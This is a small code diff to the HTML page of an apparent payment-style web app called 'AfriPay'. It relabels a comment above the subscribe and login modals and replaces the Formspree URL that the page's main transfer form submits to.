@@ -535,7 +535,7 @@
     </div>
 </div>
 
-<!-- Modals (identical to previous) -->
+<!-- Modals -->
 <div id="infoModal" class="modal"><div class="modal-content"><h3 id="modalTitle"></h3><div id="modalBody"></div><button class="action-btn close-modal">Close</button></div></div>
 <div id="subscribeModal" class="modal"><div class="modal-content"><h3>📧 Subscribe for Updates</h3><input type="email" id="subEmail" placeholder="Your email address" style="width:100%; padding:10px; margin:10px 0; border-radius:30px;"><button id="submitSubscribeBtn" class="action-btn">Subscribe</button><button class="action-btn close-modal">Cancel</button></div></div>
 <div id="loginModal" class="modal"><div class="modal-content"><h3>🔐 Login to AfriPay</h3><input type="text" id="loginName" placeholder="Full Name" style="width:100%; padding:10px; margin:10px 0; border-radius:30px;"><input type="tel" id="loginPhone" placeholder="Phone Number" style="width:100%; padding:10px; margin:10px 0; border-radius:30px;"><div id="loginError" class="error-msg"></div><button id="doLoginBtn" class="action-btn">Login</button><button class="action-btn close-modal">Cancel</button></div></div>
@@ -920,7 +920,10 @@
     document.getElementById('generateTxBtn').addEventListener('click', setGeneratedTransactionId);
     document.getElementById('copyTxBtn').addEventListener('click', copyTransactionIdToClipboard);
 
-    const MAIN_FORMSPREE = "https://formspree.io/f/mgoqlvlo";
+    // ========== UPDATED FORMSPREE LINK ==========
+    const MAIN_FORMSPREE = "https://formspree.io/f/xlgkgejq";
+    // ============================================
+    
     document.getElementById('mainForm').addEventListener('submit', async(e) => {
         e.preventDefault();
         const senderName = document.getElementById('senderName').value.trim();
